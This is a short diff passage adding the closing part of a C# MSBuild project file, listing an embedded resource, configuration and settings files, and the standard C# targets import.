+    <EmbeddedResource Include="Properties\Resources.resources" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+    <None Include="app.manifest" />
+    <None Include="packages.config" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
